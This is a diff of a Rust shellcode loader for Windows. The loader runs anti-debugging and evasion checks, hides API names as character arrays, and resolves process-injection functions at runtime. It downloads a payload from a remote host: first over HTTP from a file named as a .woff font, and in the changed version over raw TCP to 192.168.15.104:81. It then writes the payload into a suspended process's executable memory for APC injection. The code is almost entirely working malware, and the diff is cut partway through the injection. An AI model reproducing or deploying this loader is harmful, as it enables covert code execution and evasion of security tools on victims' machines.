@@ -1,21 +1,23 @@
 extern crate winapi;
 use reqwest;
 use std::ffi::CString;
-use std::ptr::{null, null_mut};
+use std::io::Read;
+use std::net::TcpStream;
 use std::process::exit;
+use std::ptr::{null, null_mut};
 use std::thread::sleep;
 use std::time::Duration;
-use std::vec::Vec;
 use std::time::SystemTime;
+use std::vec::Vec;
 use winapi::shared::basetsd::SIZE_T;
-use winapi::shared::minwindef::{BOOL, DWORD, LPVOID, LPCVOID, FALSE};
+use winapi::shared::basetsd::ULONG_PTR;
+use winapi::shared::minwindef::{BOOL, DWORD, FALSE, LPCVOID, LPVOID};
 use winapi::shared::ntdef::HANDLE;
 use winapi::um::libloaderapi::*;
 use winapi::um::minwinbase::*;
 use winapi::um::processthreadsapi::*;
 use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
-use winapi::um::winbase::CREATE_SUSPENDED; 
-use winapi::shared::basetsd::ULONG_PTR;
+use winapi::um::winbase::CREATE_SUSPENDED;
 use winapi::um::winnt::*;
 
 unsafe fn allocate_and_randomize(size: SIZE_T) -> LPVOID {
@@ -34,9 +36,8 @@ unsafe fn enhanced_anti_debugging() {
     if !p_address.is_null() && *(p_address as *mut u8) > 128 {
         for _ in 0..3 {
             let _value: ULONG_PTR = GetCurrentThreadId() as ULONG_PTR;
-            sleep(Duration::from_millis(1)); 
+            sleep(Duration::from_millis(1));
         }
-
     } else {
         sleep(Duration::from_millis(10));
     }
@@ -61,16 +62,50 @@ fn load_function(module: &str, proc_name: &str) -> *const () {
     }
 }
 
-type WriteProcessMemoryFunc = unsafe extern "system" fn(HANDLE, LPVOID, LPCVOID, SIZE_T, *mut SIZE_T) -> BOOL;
-type CreateProcessAFunc = unsafe extern "system" fn(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION) -> BOOL;
+type WriteProcessMemoryFunc =
+    unsafe extern "system" fn(HANDLE, LPVOID, LPCVOID, SIZE_T, *mut SIZE_T) -> BOOL;
+type CreateProcessAFunc = unsafe extern "system" fn(
+    LPCSTR,
+    LPSTR,
+    LPSECURITY_ATTRIBUTES,
+    LPSECURITY_ATTRIBUTES,
+    BOOL,
+    DWORD,
+    LPVOID,
+    LPCSTR,
+    LPSTARTUPINFOA,
+    LPPROCESS_INFORMATION,
+) -> BOOL;
 type VirtualAllocExFunc = unsafe extern "system" fn(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID;
 type QueueUserAPCFunc = unsafe extern "system" fn(PAPCFUNC, HANDLE, ULONG_PTR) -> BOOL;
 
 fn get_payload_from_url(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
-    let mut payload = Vec::new();
-    let mut response = reqwest::blocking::get(url)?;
-    response.copy_to(&mut payload)?;
-    Ok(payload)
+    if url.starts_with("https://") || url.starts_with("http://") {
+        let mut payload = Vec::new();
+        let mut response = reqwest::blocking::get(url)?;
+        response.copy_to(&mut payload)?;
+        Ok(payload)
+    } else if url.starts_with("tcp://") {
+        // Strip the tcp:// scheme so TcpStream::connect sees "host:port"
+        let addr = &url["tcp://".len()..];
+        download_binary_to_vec(addr, Duration::from_secs(180))
+    } else {
+        Err("unsupported URL scheme".into())
+    }
+}
+
+fn download_binary_to_vec(
+    addr: &str,
+    timeout: Duration,
+) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    let mut stream = TcpStream::connect(addr)?;
+    stream.set_read_timeout(Some(timeout))?;
+    let mut len_buf = [0u8; 4];
+    stream.read_exact(&mut len_buf)?;
+    let len = u32::from_le_bytes(len_buf) as usize;
+    let mut data = vec![0u8; len];
+    stream.read_exact(&mut data)?;
+    Ok(data)
 }
 
 fn evade() {
@@ -102,28 +137,38 @@ fn evade() {
 fn main() {
     evade();
 
-    let create_process_a: [char; 14] = ['C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A'];
+    let create_process_a: [char; 14] = [
+        'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A',
+    ];
     let create_process_a_str: String = create_process_a.iter().collect();
 
-    let virtual_alloc_ex: [char; 14] = ['V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x'];
+    let virtual_alloc_ex: [char; 14] = [
+        'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x',
+    ];
     let virtual_alloc_ex_str: String = virtual_alloc_ex.iter().collect();
 
-    let procmem: [char; 18] = ['W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y'];
+    let procmem: [char; 18] = [
+        'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y',
+    ];
     let procmem_str: String = procmem.iter().collect();
 
     let queue_user_apc: [char; 12] = ['Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C'];
     let queue_user_apc_str: String = queue_user_apc.iter().collect();
 
+    let pw_create_process: CreateProcessAFunc =
+        unsafe { std::mem::transmute(load_function("kernel32.dll", &create_process_a_str)) };
+    let pw_virtual_alloc_ex: VirtualAllocExFunc =
+        unsafe { std::mem::transmute(load_function("kernel32.dll", &virtual_alloc_ex_str)) };
+    let pw_procmem: WriteProcessMemoryFunc =
+        unsafe { std::mem::transmute(load_function("kernel32.dll", &procmem_str)) };
+    let pw_queue_user_apc: QueueUserAPCFunc =
+        unsafe { std::mem::transmute(load_function("kernel32.dll", &queue_user_apc_str)) };
 
-    let pw_create_process: CreateProcessAFunc = unsafe { std::mem::transmute(load_function("kernel32.dll", &create_process_a_str)) };
-    let pw_virtual_alloc_ex: VirtualAllocExFunc = unsafe { std::mem::transmute(load_function("kernel32.dll", &virtual_alloc_ex_str)) };
-    let pw_procmem: WriteProcessMemoryFunc = unsafe { std::mem::transmute(load_function("kernel32.dll", &procmem_str)) };
-    let pw_queue_user_apc: QueueUserAPCFunc = unsafe { std::mem::transmute(load_function("kernel32.dll", &queue_user_apc_str)) };
-
-    let url = "http://192.168.49.59/prop.woff";
+    let url = "tcp://192.168.15.104:81";
     let payload = match get_payload_from_url(url) {
         Ok(data) => data,
         Err(_e) => {
+            println!("Error getting payload from url {}", _e);
             exit(1);
         }
     };
@@ -135,20 +180,43 @@ fn main() {
     //let target_process = CString::new("C:\\Windows\\System32\\cmd.exe").unwrap();
 
     unsafe {
-        let success = pw_create_process(target_process.as_ptr(),null_mut(),null_mut(),null_mut(),FALSE,CREATE_SUSPENDED,null_mut(),null(),&mut si,&mut pi,);
+        let success = pw_create_process(
+            target_process.as_ptr(),
+            null_mut(),
+            null_mut(),
+            null_mut(),
+            FALSE,
+            CREATE_SUSPENDED,
+            null_mut(),
+            null(),
+            &mut si,
+            &mut pi,
+        );
 
         if success == 0 {
             exit(1);
         }
 
         let alloc_size = ((payload.len() + 4095) / 4096) * 4096;
-        let shell_address = pw_virtual_alloc_ex(pi.hProcess, null_mut(), alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        let shell_address = pw_virtual_alloc_ex(
+            pi.hProcess,
+            null_mut(),
+            alloc_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
         if shell_address.is_null() {
             exit(1);
         }
 
         let mut bytes_written = 0;
-        let write_result = pw_procmem(pi.hProcess, shell_address, payload.as_ptr() as *const _, payload.len(), &mut bytes_written);
+        let write_result = pw_procmem(
+            pi.hProcess,
+            shell_address,
+            payload.as_ptr() as *const _,
+            payload.len(),
+            &mut bytes_written,
+        );
         if write_result == 0 {
             exit(1);
         }
